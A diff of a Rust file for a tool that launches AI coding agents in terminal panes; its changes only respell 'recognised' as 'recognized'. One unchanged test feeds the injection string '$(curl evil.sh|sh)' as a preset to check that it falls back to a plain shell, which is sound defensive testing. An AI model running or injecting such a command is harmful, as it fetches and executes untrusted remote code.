@@ -102,7 +102,7 @@ pub fn preset_command(preset: &str, session_id: Option<&str>) -> String {
         "codex" => format!("{shell} -ilc 'codex{flag}'"),
         "cursor" => format!("{shell} -ilc 'cursor-agent{flag}'"),
         other if is_safe_model(other) => format!("{shell} -ilc '{other}{flag}'"),
-        // An unrecognised preset that is not a plain identifier is not run at
+        // An unrecognized preset that is not a plain identifier is not run at
         // all. A preset is chosen from a list; anything else is a bug or an
         // attempt.
         _ => format!("{shell} -il"),
@@ -234,7 +234,7 @@ pub struct Service {
     /// happens when two tests run in parallel, and would happen in production
     /// the first time anything set the variable after startup.
     root: PathBuf,
-    /// Which agents are recognised, and which can be hosted as a chat.
+    /// Which agents are recognized, and which can be hosted as a chat.
     ///
     /// Held rather than re-read per call, for the same reason `root` is: the
     /// config file and the environment that locates it are process-global, and
@@ -333,7 +333,7 @@ impl Service {
         Arc::clone(locks.entry(repository_id).or_default())
     }
 
-    /// Which agents are recognised, and which can be hosted as a chat.
+    /// Which agents are recognized, and which can be hosted as a chat.
     pub fn registry(&self) -> &farcooler_core::activity::Registry {
         &self.registry
     }
@@ -1907,7 +1907,7 @@ mod preset_tests {
     }
 
     #[test]
-    fn an_unrecognised_preset_that_is_not_an_identifier_runs_nothing() {
+    fn an_unrecognized_preset_that_is_not_an_identifier_runs_nothing() {
         let out = preset_command("$(curl evil.sh|sh)", None);
         assert!(!out.contains("curl"));
         assert!(out.ends_with("-il"), "falls back to a plain shell");
@@ -2034,13 +2034,13 @@ pub fn canonical_or_raw(path: &str) -> PathBuf {
 mod chat_capability_tests {
     #[test]
     fn recognition_and_hostability_can_no_longer_disagree() {
-        // This test exists because they did. Codex was recognised by
+        // This test exists because they did. Codex was recognized by
         // `activity::identify` and absent from the daemon's separate chat list, so
         // `⌃B a` on a codex pane did nothing and explained nothing. There is now
         // one table, and hostability is a field on it.
         let r = farcooler_core::activity::Registry::built_in();
         assert!(r.chat_capable("claude"));
-        assert!(r.chat_capable("codex"), "codex is recognised AND hostable");
+        assert!(r.chat_capable("codex"), "codex is recognized AND hostable");
         assert!(!r.chat_capable("zsh"), "a shell is neither");
     }
 }
